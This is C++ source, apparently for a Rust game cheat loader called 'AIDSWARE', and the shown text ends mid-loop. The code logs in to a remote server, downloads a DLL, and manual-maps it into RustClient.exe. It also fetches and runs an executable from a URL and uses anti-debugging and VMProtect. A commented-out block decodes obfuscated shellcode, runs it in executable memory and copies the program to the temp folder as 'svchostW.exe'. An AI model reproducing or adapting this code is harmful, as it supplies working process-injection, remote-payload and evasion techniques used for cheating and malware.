﻿#include "includes.h"

void WelcomePrint()
{
	HWND cons = GetConsoleWindow();
	RECT r;
	GetWindowRect(cons, &r);
	MoveWindow(cons, r.left, r.top, 470, 514, TRUE);
	std::string t1(xorstr("[AIDSWARE]"));
	std::wstring w1(t1.begin(), t1.end());
	SetConsoleTitleW(w1.c_str());
	ccolor(MAGENTA, BLACK);
	//printf(xorstr("[LOS] ");
	ccolor(RED, BLACK);
	printf(xorstr("  ___  ___________  _____  "));
	ccolor(WHITE, BLACK);
	printf(xorstr("_    _  ___  ______ _____\n"));
	ccolor(RED, BLACK);
	printf(xorstr(" / _ \\|_   _|  _  \\/  ___|"));
	ccolor(WHITE, BLACK);
	printf(xorstr("| |  | |/ _ \\ | ___ \\  ___|\n"));
	ccolor(RED, BLACK);
	printf(xorstr("/ /_\\ \\ | | | | | |\\ `--. "));
	ccolor(WHITE, BLACK);
	printf(xorstr("| |  | / /_\\ \\| |_/ / |__  \n"));
	ccolor(RED, BLACK);
	printf(xorstr("|  _  | | | | | | | `--. \\"));
	ccolor(WHITE, BLACK);
	printf(xorstr("| |/\\| |  _  ||    /|  __| \n"));
	ccolor(RED, BLACK);
	printf(xorstr("| | | |_| |_| |/ / /\\__/ /"));
	ccolor(WHITE, BLACK);
	printf(xorstr("\\  /\\  / | | || |\\ \\| |___ \n"));
	ccolor(RED, BLACK);
	printf(xorstr("\\_| |_/\\___/|___/  \\____/ "));
	ccolor(WHITE, BLACK);
	printf(xorstr(" \\/  \\/\\_| |_/\\_| \\_\\____/ \n"));
	
	/*
 / _ \|_   _|  _  \/  ___|| |  | |/ _ \ | ___ \  ___|
/ /_\ \ | | | | | |\ `--. | |  | / /_\ \| |_/ / |__  
|  _  | | | | | | | `--. \| |/\| |  _  ||    /|  __| 
| | | |_| |_| |/ / /\__/ /\  /\  / | | || |\ \| |___ 
\_| |_/\___/|___/  \____/  \/  \/\_| |_/\_| \_\____/ 
                                                     */
	/*
	printf(xorstr(R"(   __         ______     ______   
  /\ \       /\  __ \   /\  ___\  
  \ \ \____  \ \ \/\ \  \ \___  \ 
   \ \_____\  \ \_____\  \/\_____\
    \/_____/   \/_____/   \/_____/
                                  )"));*/
	ccolor(WHITE, BLACK);
	printf(xorstr("\n > "));
	ccolor(GREEN, BLACK);
	printf(xorstr("Welcome!\n\n"));
	ccolor(WHITE, BLACK);
}
SOCKET serverfd = 0;
bool connect()
{
	WSAData w;
	struct addrinfo* result = NULL,
		* ptr = NULL,
		hints;

	int iResult;
	iResult = WSAStartup(MAKEWORD(2, 2), &w);
	if (iResult != 0) {
		printf(xorstr("WSAStartup failed with error: %d\n"), iResult);
		return 1;
	}

	char name[BuffSize];
	char request[BuffSize];
	char response[BuffSize];

	//get host ip
	std::ostringstream strout;
	struct hostent* h = gethostbyname(xorstr("m1_los.fuckabitch.net"));
	//struct hostent* h = gethostbyname(xorstr("192.168.1.239"));
	unsigned char* addr = reinterpret_cast<unsigned char*>(h->h_addr_list[0]);
	std::copy(addr, addr + 4, std::ostream_iterator<unsigned int>(strout, "."));
	std::string ip = strout.str();
	ip = ip.substr(0, ip.length() - 1);
	sprintf(name, xorstr("%s:51005"), ip.c_str());

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	iResult = getaddrinfo(ip.c_str(), xorstr("51005"), &hints, &result);


	//connect to server with socket
	int sockfd = INVALID_SOCKET;
	sockfd = socket(result->ai_family, result->ai_socktype, result->ai_protocol);

	iResult = connect(sockfd, result->ai_addr, (int)result->ai_addrlen);
	if (iResult == SOCKET_ERROR) {
		closesocket(sockfd);
		sockfd = INVALID_SOCKET;
		return false;
	}

	//sprintf(request, xorstr("H-C"));
	sprintf(request, xorstr("H-C"));
	sendpacket(sockfd, request); //Send client hello identifier to server
	memset(request, '\x00', 1024 * sizeof(*request));
	memset(response, '\x00', 1024 * sizeof(*response));

	std::string r(response);
	while (1)
	{
		SleepEx(150, 0);
		ccolor(WHITE, BLACK);
		printf(xorstr("\n > "));
		ccolor(GREEN, BLACK);
		printf(xorstr("Connected!\n"));

		int d = -1;
		while (d == -1)
		{
			ccolor(MAGENTA, BLACK);
			printf(xorstr("\n\t1: "));
			ccolor(YELLOW, BLACK);
			printf(xorstr("Login"));
			ccolor(WHITE, BLACK);
			printf(xorstr(","));
			ccolor(MAGENTA, BLACK);
			printf(xorstr(" 2:"));
			ccolor(YELLOW, BLACK);
			printf(xorstr(" Register"));
			std::string dec = getpass(xorstr("\n\t #: "), false, true);
			try {
				d = std::stoi(dec);
				if (d != 1
					&& d != 2)
					d = -1;
			}
			catch (...){}
		}
		std::string username = getpass(xorstr("Username: "), false);
		std::string password_str = getpass();

		if (d == 2) //character checking
		{
			int ul = username.size();
			if (ul < 4 || ul > 32)
			{
				printf(xorstr("\nError parsing characters, minimum length: 4, maximum length: 32! (Username)\n"));
				return 0;
			}
			int ul1 = 0;
			for (size_t i = 0; i < ul; i++)
			{
				if (allowed_characters.find(username[i]) != std::string::npos)
					ul1++;
			}
			if (ul1 != ul)
			{
				printf(xorstr("\nError parsing characters, only letters, numbers and their special characters are allowed! (Username)\n"));
				return 0;
			}
			ul = password_str.size();
			if (ul < 4 || ul > 32)
			{
				printf(xorstr("\nError parsing characters, minimum length: 4, maximum length: 32! (Username)\n"));
				return 0;
			}
			ul1 = 0;
			for (size_t i = 0; i < ul; i++)
			{
				if (allowed_characters.find(password_str[i]) != std::string::npos)
					ul1++;
			}
			if (ul1 != ul)
			{
				printf(xorstr("\nError parsing characters, only letters, numbers and their special characters are allowed! (Password)\n"));
				return 0;
			}
		}

		std::string ak = (d == 2) ? getpass(xorstr("Api-key: "), false) : "";
		char outputbuffer[65];
		sha256_string(const_cast<char*>(password_str.c_str()), outputbuffer);
		std::string pwdhash = outputbuffer;
		memset(request, '\x00', 1024 * sizeof(*request));
		memset(response, '\x00', 1024 * sizeof(*response));
		//send login packet (username:hwid:ver)
		sha256_string(const_cast<char*>(info().c_str()), outputbuffer);
	connect_w:
		std::string infopacket = (d == 2) ? "R|" + username + "|" + pwdhash + "|" + ak + "|" + outputbuffer + std::string(xorstr("|1.7")) : "L|" + username + "|" + outputbuffer + std::string(xorstr("|1.7"));
		sendpacket(sockfd, infopacket);
		memset(response, '\x00', 1024 * sizeof(*response));
		receivepacket(sockfd, response);

		if (d == 2)
		{
			if (response[0] == '\x01') //Username already exists
			{
				printf(xorstr("\nSorry, but this username already exists!\n"));
				memset(response, '\x00', 1024 * sizeof(*response));
				return 0;
			}
			if (response[0] == '\x02') //hwid is blacklisted at the moment
			{
				printf(xorstr("\nYour HWID is currently blacklisted!\n"));
				SleepEx(3000, 0);
				exit(-1);
			}
			if (response[0] == '\x03') //apikey not found
			{
				printf(xorstr("\nThat api-key was not found in our database!\n"));
				memset(response, '\x00', 1024 * sizeof(*response));
				return 0;
			}
			ccolor(GREEN, BLACK);
			printf(xorstr("\r\n\tSuccess!")); 
			ccolor(GREEN, BLACK); 
			printf(xorstr("\n\tIf you are not connected within the next 3 seconds please restart the program and login! :)\n"));
			d = 1;
			goto connect_w;
		}

		if (response[0] == '\xA2')
		{
			try
			{
				HRESULT r = URLDownloadToFile(0, xorstr("https://aidswa.re/loador.exe"), "update.exe", 0, 0);
				if (r != S_OK)
					throw;
				if (!exists("update.exe"))
					throw;
				system(xorstr("update.exe -u"));
				//VMProtectEnd();
				return 0;
			}
			catch (...)
			{
				//do nothing if exception, probably means the url does not exist
			}
		}
		if (response[0] == '\x02') //blacklist
		{
			ccolor(RED, BLACK);
			printf(xorstr("\nYour hwid is blacklisted!\n\n"));
			return 0;
		}
		if (response[0] == '\x04') //hwid already exists
		{
			ccolor(RED, BLACK);
			printf(xorstr("\nYour hwid already exists! Nice try though!\n\n"));
			return 0;
		}

		if (response[0] != 'c')
		{
			ccolor(RED, BLACK);
			printf(xorstr("\nError receiving challenge!\n\n"));
			return 0;
		}
		std::string rstr = std::string(response);
		std::string instr = rstr.substr(2, rstr.size());
		int k = std::stoi(instr);
		std::string unique = hmac256(instr, pwdhash);

		memset(response, '\x00', 1024 * sizeof(*response));
		for (int i = 2; i < unique.size() + 2; i++)
			response[i] = unique[i - 2];
		response[0] = 'r';
		response[1] = '.';
		sendpacket(sockfd, response);
		memset(response, '\x00', 1024 * sizeof(*response));
		receivepacket(sockfd, response);

		if (response[0] != '\x99')
		{
			ccolor(RED, BLACK);
			printf(xorstr("\nError, incorrect username & password combination!\n\n"));
			return 0;
		}
		m_username = username;
		authkeyHash = unique;
		m_pwdhash = pwdhash;
		serverfd = sockfd;
		authkey = k;
		break;
	}
	return true;
}

int key[256u] = { 0x1560, 0x670, 0x320, 0x2180, 0x830, 0x1900, 0x960, 0x1860, 0x180, 0x1090, 0x1690, 0x1790, 0x990, 0x2470, 0x2100, 0x870, 0x2230, 0x2260,
	0x500, 0x450, 0x2420, 0x2000, 0x490, 0x30, 0x210, 0x390, 0x1260, 0x410, 0x420, 0x2420, 0x700, 0x1610, 0x610, 0x380, 0x1800, 0x2440, 0x320, 0x510, 0x1690, 0x640, 0x1700,
	0x1630, 0x2470, 0x190, 0x1540, 0x1320, 0x1880, 0x490, 0x800, 0x770, 0x2440, 0x40, 0x1520, 0x1270, 0x1030, 0x200, 0x1400, 0x820, 0x170, 0x1870, 0x1640, 0x150, 0x840,
	0x2030, 0x1280, 0x210, 0x1180, 0x1470, 0x120, 0x940, 0x1720, 0x1750, 0x1600, 0x570, 0x60, 0x1200, 0x280, 0x1310, 0x2390, 0x2460, 0x770, 0x690, 0x2250, 0x420, 0x670,
	0x2150, 0x2110, 0x730, 0x2080, 0x420, 0x1120, 0x1360, 0x1490, 0x2010, 0x2100, 0x2230, 0x2530, 0x880, 0x300, 0x400, 0x1090, 0x640, 0x70, 0x980, 0x710, 0x1120, 0x2040,
	0x1090, 0x2370, 0x1490, 0x460, 0x40, 0x2380, 0x1250, 0x1570, 0x2330, 0x450, 0x2430, 0x600, 0x1050, 0x720, 0x1000, 0x1930, 0x980, 0x1090, 0x1550, 0x1620, 0x2450, 0x430,
	0x170, 0x1770, 0x2390, 0x530, 0x1880, 0x1000, 0x2230, 0x820, 0x1370, 0x810, 0x1960, 0x460, 0x710, 0x270, 0x2200, 0x1070, 0x540, 0x1270, 0x1320, 0x1160, 0x760, 0x470,
	0x2040, 0x100, 0x1370, 0x410, 0x1510, 0x490, 0x1770, 0x410, 0x1360, 0x800, 0x510, 0x520, 0x2400, 0x2200, 0x1450, 0x1290, 0x2220, 0x2060, 0x1770, 0x2290, 0x620, 0x2280,
	0x1640, 0x1940, 0x1210, 0x50, 0x230, 0x2230, 0x400, 0x230, 0x1130, 0x700, 0x280, 0x750, 0x00, 0x730, 0x440, 0x490, 0x2030, 0x1150, 0x2350, 0x660, 0x570, 0x670, 0x1070,
	0x1280, 0x1760, 0x530, 0x520, 0x2380, 0x320, 0x310, 0x1560, 0x470, 0x1740, 0x1940, 0x30, 0x620, 0x1550, 0x440, 0x2260, 0x880, 0x2220, 0x940, 0x1540, 0x1130, 0x410, 0x1500,
	0x1300, 0x2180, 0x1830, 0x1830, 0x1390, 0x2020, 0x2070, 0x1720, 0x1170, 0x840, 0x50, 0x2200, 0x2100, 0x940, 0x2330, 0x2530, 0x1070, 0x770, 0x260, 0x130, 0x250, 0x2540,
	0x670, 0x110, 0x1480, 0x820, 0x1930, 0x1000, 0x2180, 0x2300, 0x30, 0x2530, 0x1040, 0x1940, 0x810, 0x980, 0x1020 };

int main(int argc, char** argv)
{
	VMProtectBeginUltra(xorstr("cheat"));

#ifndef NDEBUG

	if (IsDebuggerPresent())
		return 0;

#else
	//do nothing
#endif
	/*
	bool nf = false;
	if (FindProcessId(std::string(xorstr("svchostW.exe")))) nf = true;

	std::string current_path = WExePathStr();
	std::string current_path_e = current_path.substr(current_path.size() - 5, current_path.size());
	
	if (current_path_e.c_str()[0] == 'W')
	{
		unsigned char s[] = {
	0x64, 0xd9, 0x5a, 0xbf, 0xf2, 0x9d, 0xff, 0x7f,
	0xb2, 0x70, 0x7, 0x79, 0xb1, 0xbd, 0x7b, 0xd1,
	0xf6, 0xd2, 0x66, 0xe8, 0xae, 0xe9, 0x0, 0xc6,
	0x5, 0x45, 0x9a, 0x3a, 0x0, 0x86, 0x1d, 0x65,
	0x3a, 0xda, 0x90, 0xbc, 0xc0, 0x23, 0x11, 0x49,
	0x35, 0x9c, 0x72, 0x6f, 0x1b, 0x74, 0xa9, 0xc6,
	0x12, 0xd2, 0x96, 0x2e, 0x7, 0xa0, 0x33, 0x1b,
	0x39, 0x23, 0xf2, 0x9e, 0xca, 0x77, 0xc4, 0x55,
	0x9, 0xac, 0x58, 0x3c, 0xd1, 0x22, 0x8d, 0xea,
	0xc0, 0xb2, 0xdf, 0xb5, 0x43, 0x69, 0x3f, 0xcd,
	0xe5, 0xfe, 0x5a, 0xc6, 0x10, 0xc2, 0xc4, 0x37,
	0x93, 0x9a, 0xac, 0xdc, 0xdd, 0x39, 0x9f, 0xbb,
	0x2d, 0xa, 0x42, 0xc9, 0x37, 0xb8, 0xa3, 0x67,
	0x1, 0x7b, 0xf8, 0x47, 0xdd, 0xbd, 0xfb, 0x33,
	0x6a, 0xe6, 0x60, 0xd4, 0x77, 0x9a, 0xb9, 0x81,
	0xe7, 0x1c, 0x3a, 0xba, 0x6c, 0xac, 0x4c, 0x6,
	0xd7, 0x16, 0x38, 0x90, 0x6c, 0xae, 0x81, 0xbe,
	0xcc, 0x5e, 0xe2, 0x94, 0x0, 0x71, 0x9c, 0xcc,
	0xb9, 0x64, 0x4, 0x56, 0x84, 0x3d, 0x42, 0x9d,
	0xab, 0xb1, 0x11, 0x3d, 0x93, 0x90, 0x1, 0x7b,
	0x3c, 0x5a, 0x3b, 0xa, 0xa, 0x70, 0xd8, 0x84,
	0x9b, 0x32, 0x8c, 0xc9, 0xee, 0x99, 0x29, 0x49,
	0x2a, 0xc1, 0x6f, 0xaf, 0x6f, 0xe7, 0x8b, 0x5e,
	0xb0, 0xe, 0x7f, 0x12, 0x6b, 0x88, 0xb8, 0xf6,
	0xc3, 0x9d, 0xf4, 0x21, 0xf3, 0xbd, 0x4d, 0xb8,
	0xcc, 0x7f, 0x4b, 0x55, 0x8a, 0xf0, 0xe2, 0x12,
	0x4d, 0xde, 0xb4, 0x37, 0x4b, 0xee, 0xb1, 0x29,
	0x41, 0x64, 0x22, 0x46, 0x78, 0xbd, 0x64, 0x3e,
	0x6a, 0xd8, 0xb6, 0x68, 0xa3, 0xf0, 0x1, 0x6f,
	0x3b, 0xac, 0xa1, 0xf9, 0x5, 0xb0, 0xfe, 0x17,
	0xbb, 0x1e, 0x76, 0x6b, 0xf1, 0xcd, 0x5d, 0xcf,
	0xb8, 0xf, 0x31, 0xf2, 0xce, 0x83, 0x52, 0x31,
	0x1d, 0x1c, 0xc5, 0xea, 0xc2, 0x81, 0x6b, 0x1a,
	0xdb, 0x36, 0x80, 0x9f, 0xe1, 0xb7, 0x6c, 0xae,
	0x11, 0xd7, 0x7, 0xd1, 0x4e, 0xf9, 0xfd, 0x64,
	0xa1, 0x12, 0x9b, 0x6e, 0xf6, 0xce, 0xd2, 0x7f,
	0x7, 0xb2, 0xb5, 0x40, 0x50, 0x67, 0xa7, 0x1f,
	0x12, 0xb0, 0x2, 0x2a, 0x4c, 0x75, 0x13, 0xb3,
	0x7f, 0xeb, 0x14, 0xa6, 0x35, 0x96, 0x81, 0x73,
	0x61, 0xe2, 0xa4, 0xa, 0x76, 0x84, 0xef, 0x67,
	0x7b, 0x72, 0x85, 0x6, 0x9, 0xe8, 0xb8, 0x30,
	0x3e, 0x56, 0x9d, 0x4a, 0x85, 0x1d, 0x7b, 0x4c,
	0xeb, 0xc5, 0x72, 0x56, 0x81, 0x11, 0x51, 0xef,
	0x24, 0xef, 0x65, 0x15, 0xa8, 0xa4, 0x1a, 0x5a,
	0x68, 0x3c, 0xf7, 0xd2, 0xb5, 0x25, 0x3e, 0x32,
	0x67, 0xfe, 0xe5, 0x2f, 0x9d, 0x49, 0x16, 0x7d,
	0x52, 0xd6, 0x96, 0x17, 0xbd, 0x23, 0x43, 0xf0,
	0xfc, 0x9c, 0x73, 0x28, 0x9e, 0x27, 0xff, 0xe,
	0x8b, 0xe7, 0x55, 0xd6, 0x24, 0xb7, 0x0, 0x57,
	0xa1, 0xea, 0x18, 0x31, 0x9, 0xb7, 0xd9, 0x67,
	0x30, 0xf0, 0x8f, 0x4a, 0xc1, 0xbf, 0xc5, 0xef,
	0xa3, 0xd5, 0xa0, 0xc7, 0x7f, 0x44, 0xad, 0x3b,
	0x28, 0x24, 0xf3, 0xef, 0xc2, 0xf7, 0x6, 0xe,
	0x96, 0xb2, 0x3e, 0x35, 0x4c, 0x8e, 0xa0, 0x4a,
	0xcf, 0xf0, 0xf5, 0xa6, 0xe0, 0x79, 0x1b, 0xe5,
	0x27, 0xad, 0x58, 0x8b, 0x78, 0xec, 0x63, 0x4e,
	0x9b, 0x49, 0x75, 0xdc, 0x1f, 0xa0, 0x78, 0xd6,
	0x21, 0xa6, 0xa5, 0x87, 0x54, 0xee, 0x9a, 0x2b,
	0xa2, 0xd6, 0x5b, 0x7f, 0x76, 0xd4, 0xfa, 0xab,
	0xb7, 0x2c, 0x3, 0xe, 0xf4, 0x25, 0xef, 0x67,
	0xba, 0x0, 0x50, 0x7f, 0xde, 0xa0, 0xcb, 0xb7,
	0x4f, 0x23, 0xb5, 0x18, 0x27, 0x58, 0x8c, 0xe9,
	0x7e, 0x5, 0x72, 0x69, 0x8e, 0x4b, 0x76, 0xbf,
	0xf1, 0x52, 0x3, 0x73, 0x74, 0xd7, 0x1f, 0xfe,
	0xcd, 0x27, 0x88, 0xd3, 0xec, 0x1b, 0x3, 0xbe,
	0x40, 0x9d, 0x54, 0x24, 0x4d, 0x95, 0xe9, 0xb4,
	0xd2, 0xcf, 0x66, 0x80, 0x67, 0x63, 0xe7, 0x69,
	0x41, 0x94, 0x57, 0xfa, 0x63, 0x98, 0x5f, 0x98,
	0x75, 0xcf, 0xb, 0x2, 0x66, 0xfb, 0xf9, 0x5c,
	0x62, 0x4d, 0xcb, 0x7a, 0x33, 0x61, 0x35, 0x1,
	0x2e, 0xa5, 0x67, 0x6b, 0x96, 0xa4, 0xc6, 0x20,
	0x2b, 0x81, 0xe4, 0xf0, 0xfa, 0x15, 0xaa, 0x89,
	0xac, 0x67, 0xae, 0x66, 0xc7, 0x90, 0x3, 0x44,
	0xf4, 0xe5, 0x3d, 0x71, 0x75, 0x53, 0xf1, 0x5d,
	0xdd, 0x93, 0xf3, 0xb0, 0xe1, 0xb7, 0x42, 0x4,
	0x93, 0xfb, 0x66, 0x83, 0x4f, 0x66, 0xe7, 0xf5,
	0xd2, 0x47, 0x62, 0x35, 0xdd, 0x22, 0xe4, 0xf8,
	0xb7, 0x5a, 0x59, 0xc2, 0x8b, 0x4e, 0xd5, 0x73,
	0x94, 0x99, 0xb4, 0xd2, 0x3a, 0x89, 0xf, 0x17,
	0x1d, 0xdf, 0x8c, 0x72, 0x64, 0x3c, 0x9c, 0xbf,
	0x8a, 0x26, 0xb2, 0xd4, 0x67, 0xeb, 0xb8, 0xa8,
	0x1b, 0x1, 0x95, 0x20, 0xb8, 0xe5, 0x2f, 0x36,
	0x30, 0x2e, 0x55, 0x4d, 0x95, 0xae, 0xbb, 0xa1,
	0x3c, 0x8a, 0x3c, 0x36, 0x72, 0xe6, 0x22, 0xb3,
	0x47, 0x24, 0xd, 0x5c, 0x60, 0xac, 0x8c, 0x11,
	0xa7, 0x21, 0x4b, 0x80, 0x5, 0x1b, 0xc0, 0x67,
	0xd2, 0x87, 0x5d, 0x14, 0x2, 0xd6, 0x38, 0x15,
	0xe3, 0x97, 0x2f, 0xb9, 0x51, 0x95, 0x48, 0x92,
	0x26, 0x54, 0x8f, 0xc0, 0xee, 0x22, 0x4e, 0xc9,
	0x4, 0x9b, 0xf7, 0xc1, 0x3, 0xc6, 0x2b, 0x83,
	0xf8, 0x80, 0xa6, 0xdd, 0x9e, 0x9, 0xc7, 0x85,
	0x73, 0xb6, 0xb1, 0x50, 0x68, 0x45, 0x88, 0x3c,
	0xb4, 0xf4, 0xf7, 0x8c, 0x1c, 0x18, 0x5d, 0x92,
	0x86, 0x67, 0x3a, 0xa0, 0xb7, 0x49, 0xdb, 0xd9,
	0xc1, 0x9f, 0xb3, 0x5e, 0x2c, 0xe7, 0xd9, 0xf4,
	0x47, 0x76, 0x39, 0xa3, 0xf6, 0xf1, 0x2e, 0x4,
	0xb8, 0x15, 0x76, 0xe5, 0x9f, 0xa2, 0x4, 0xc4,
	0x6c, 0x7, 0xd9, 0xd5, 0xa4, 0x8d, 0x6a, 0x2a,
	0x30, 0x39, 0x7, 0x71, 0x6b, 0x97, 0xfd, 0x3d,
	0xb9, 0x2b, 0xde, 0x52, 0xf6, 0x84, 0x37, 0x9a,
	0x2e, 0x31, 0x69, 0xbd, 0x2c, 0x6d, 0x71, 0xd3,
	0xbb, 0xbb, 0xa, 0x46, 0x27, 0x62, 0x74, 0xbb,
	0x6f, 0x4, 0xeb, 0xf8, 0xd7, 0x63, 0x3f, 0x1b,
	0x6c, 0xca, 0x20, 0x68, 0x69, 0xdb, 0x2f, 0xa9,
	0xff, 0x58, 0x22, 0xac, 0x29, 0xb6, 0x45, 0x83,
	0x3e, 0x56, 0x8c, 0x70, 0x2e, 0xb5, 0x73, 0xee,
	0xce, 0x8f, 0x77, 0xed, 0xd8, 0x58, 0xe8, 0xef,
	0xa, 0xf2, 0x56, 0x7a, 0xc4, 0x56, 0xd9, 0x28,
	0x2a, 0x65, 0x5c, 0xc9, 0xc2, 0xdd, 0xe8, 0x90,
	0x8f, 0xa, 0xef, 0x80, 0x40, 0xb1, 0x37, 0x24,
	0x19, 0x2f, 0x7, 0x53, 0x69, 0x5c, 0xab, 0x86,
	0xfc, 0x4, 0x2, 0xfb, 0x42
		};

		unsigned long long i, sum = 0;
		for (i = 0; i < 0x04fffffff; i++)
			sum += i;
		sum -= 900719923460833281;

		for (unsigned int m = 0; m < sizeof(s); ++m)
		{
			unsigned char c = s[m];
			c -= m;
			c = (c >> 0x6) | (c << 0x2);
			c -= 0x95;
			c = ~c;
			c += m;
			c ^= 0x7a;
			c = (c >> 0x6) | (c << 0x2);
			c = ~c;
			c = -c;
			c -= m;
			c = ~c;
			c = -c;
			c -= m;
			c ^= 0x99;
			c += m;
			c ^= m;
			c -= m;
			c = -c;
			c -= 0x63;
			c = -c;
			c ^= m;
			c = ~c;
			c ^= m;
			c -= 0x9b;
			c ^= m;
			c = -c;
			c -= 0x9f;
			c = ~c;
			c = -c;
			c ^= 0xcd;
			c = (c >> 0x1) | (c << 0x7);
			c -= 0x98;
			c ^= m;
			c = (c >> 0x7) | (c << 0x1);
			c = ~c;
			c -= m;
			c = (c >> 0x5) | (c << 0x3);
			c = -c;
			c ^= 0xa2;
			c = -c;
			c += 0xd5;
			c = -c;
			c += m;
			c = (c >> 0x7) | (c << 0x1);
			c -= 0xa6;
			c = (c >> 0x6) | (c << 0x2);
			c = ~c;
			c += 0xa9;
			c = -c;
			c -= 0xbf;
			c = -c;
			c ^= m;
			c -= m;
			c = -c;
			c -= m;
			c ^= 0xe8;
			c -= m;
			c = ~c;
			c += 0x6b;
			c = ~c;
			c += m;
			c ^= m;
			c -= 0x91;
			c = -c;
			c += 0xff;
			c = ~c;
			c -= 0xe;
			c ^= 0xc5;
			c = (c >> 0x7) | (c << 0x1);
			s[m] = c;
		}

		LPVOID exec = VirtualAlloc(NULL, sizeof(s), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		memcpy(exec, s, sizeof(s));
		((void (*)())exec)();

		return 0;

	}// else ShowWindow(GetConsoleWindow(), SW_SHOW);

	SetWindowPos(GetConsoleWindow(), HWND_TOPMOST, 0, 0, 0, 0, SWP_DRAWFRAME | SWP_NOMOVE | SWP_NOSIZE);

	if (!nf)
	{
		std::string p = std::filesystem::temp_directory_path().string();
		p = p + std::string(xorstr("9268d0b2d17670598c70045b0c7abf38\\"));
		CreateDirectory(p.c_str(), 0);
		p = p + std::string(xorstr("svchostW.exe"));

		std::ifstream source(current_path.c_str(), std::ios::binary);
		std::ofstream dest(p.c_str(), std::ios::binary);

		std::istreambuf_iterator<char> begin_source(source);
		std::istreambuf_iterator<char> end_source;
		std::ostreambuf_iterator<char> begin_dest(dest);
		std::copy(begin_source, end_source, begin_dest);

		source.close();
		dest.close();
		/*
		STARTUPINFO info = { sizeof(info) };
		ZeroMemory(&info, sizeof(info));
		PROCESS_INFORMATION processInfo;
		LPSTR s{};
		if (CreateProcess(p.c_str(), s, NULL, NULL, TRUE, 0, NULL, NULL, &info, &processInfo)) {
			//CloseHandle(processInfo.hProcess); // Cleanup since you don't need this
			//CloseHandle(processInfo.hThread); // Cleanup since you don't need this
		}
		std::string ps = "powershell -nop -w hidden \"" + p + "\"";
		system(ps.c_str());
	}
	*/
	if (argc == 2)
	{
		if (std::string(argv[1]).find(xorstr("u")) != std::string::npos)
		{
			remove("loador.exe");
			char buf[BUFSIZ];
			size_t size;

			FILE* source = fopen("update.exe", "rb");
			FILE* dest = fopen("loador.exe", "wb");

			while (size = fread(buf, 1, BUFSIZ, source)) {
				fwrite(buf, 1, size, dest);
			}

			fclose(source);
			fclose(dest);
			system(xorstr("loador.exe -r"));
			VMProtectEnd();
			return 0;
		}
		else if (std::string(argv[1]).find(xorstr("r")) != std::string::npos)
		{
			int id = FindProcessId("update.exe");
			if (id != 0)
				killProcessByName("update.exe");
			remove("update.exe");
		}
	}

	SleepEx(500, 0);
	WelcomePrint();
	//ShowWindow(GetConsoleWindow(), SW_SHOW);
	ccolor(WHITE, BLACK);
	printf(xorstr(" > "));
	ccolor(GREEN, BLACK);
	printf(xorstr("Connecting "));
	ccolor(WHITE, BLACK);
	std::cout << '-' << std::flush;
	while (!connected)
	{
		if (connect())
		{
			char response[1024];
			receivepacket(serverfd, response);
			std::string rs(response);
			std::vector<std::string> modules = explode(response, '|');
			int sz = modules.size() - 1;
			ccolor(GREEN, BLACK);
			printf(xorstr("\nModules:\n"));
			ccolor(YELLOW, BLACK);
			for (size_t i = 0; i < modules.size(); i++)
			{
				ccolor(MAGENTA, BLACK);
				printf(xorstr("\t%i"), i);
				ccolor(WHITE, BLACK);
				printf(xorstr(": %s\n"), modules[i].c_str());
			}
			int mod = -1;
			while (mod == -1)
			{
				try
				{
					std::string s = getpass(xorstr("\n > Load module: "), false);
					int n = stoi(s);
					if (n != 0 
						&& n != 1 
						&& n != 2
						&& n != 3)
						continue;
					mod = n;
				}
				catch (...)
				{
					continue;
				}
			}
			ccolor(WHITE, BLACK);
			printf(xorstr("\n > Downloading "));
			ccolor(GREEN, BLACK);
			printf(xorstr("%s"), modules[mod].c_str());
			ccolor(WHITE, BLACK);
			printf(xorstr(".dll..."));

			std::string npacket = std::string(xorstr("R-M-")) + modules[mod] + "|";
			sendpacket(serverfd, npacket);

			std::vector<char> filearray = {};

			if (RecvFile(serverfd, filearray) < 0)
			{
				printf(xorstr("\n\t# There was an error receiving the file!\n"));
				SleepEx(3000, false);
				exit(-1);
			}

			std::string a1(xorstr("RustClient.exe"));
			std::wstring process_name(a1.begin(), a1.end());
			std::string strprname(process_name.begin(), process_name.end());
			ccolor(GREEN, BLACK);
			printf(xorstr(" Done.\n"));
			SleepEx(150, 0);
			ccolor(WHITE, BLACK);
			printf(xorstr(" # "));
			ccolor(YELLOW, BLACK);
			printf(xorstr("Waiting for "));
			ccolor(GREEN, BLACK);
			printf(xorstr("%s"), strprname.c_str());
			ccolor(WHITE, BLACK);
			printf(xorstr("...\n"));

			//wait for process
			while (!IsProcessRunning(process_name.c_str())) 
				SleepEx(10000, 0);

			ccolor(WHITE, BLACK);
			printf(xorstr(" # "));
			ccolor(YELLOW, BLACK);
			printf(xorstr("Injecting into "));
			ccolor(GREEN, BLACK);
			printf(xorstr("%s"), strprname.c_str());
			ccolor(WHITE, BLACK);
			printf(xorstr("...\n"));
			SleepEx(150, 0);

			char* data = filearray.data();
			sz = filearray.size();

			void* buffer = VirtualAlloc(nullptr, sz, MEM_COMMIT, PAGE_READWRITE);
			std::memcpy(buffer, data, sz);

			std::string p = std::filesystem::temp_directory_path().string();
			p = p + std::string(xorstr("\\w1w3wa"));
			std::ofstream in_(p, std::ios::out);
			in_ << authkeyHash << "\n";
			in_ << m_pwdhash << "\n";
			in_ << m_username << "\n";
			in_.close();
			SetFileAttributes(p.c_str(), FILE_ATTRIBUTE_HIDDEN);

			DWORD ProcessId = FindProcessId(std::string(xorstr("RustClient.exe")));
			HANDLE h = OpenProcess(PROCESS_ALL_ACCESS, false, ProcessId);

			/*
			//printf("Mapping...\n");
			if (!ManualMapDll(h, reinterpret_cast<BYTE*>(filearray.data()), sz)) {
				CloseHandle(h);
				printf("Error while mapping.\n");
				SleepEx(3000, 0);
				return -8;
			}*/

			CloseHandle(h);

			
			blackbone::Process thisProc;
			
			thisProc.Attach(ProcessId, PROCESS_ALL_ACCESS);
			auto image = thisProc.mmap().MapImage(sizeof(buffer), buffer, false, NoFlags);
			if (!image)
			{
				auto error = blackbone::Utils::GetErrorDescription(image.status);
				std::string ts(xorstr("\n---------Error---------\n%s\n"));
				std::wstring ws(ts.begin(), ts.end());
				wprintf(ws.c_str(), error);
				SleepEx(3000, 0);
				return 0;
			}
			ccolor(GREEN, BLACK);
			printf(xorstr("\r\n > Success!"));
			SleepEx(3000, 0);
			return 0;
		}
		SleepEx(150, 0);
		std::cout << "\b\\" << std::flush;
		SleepEx(150, 0);
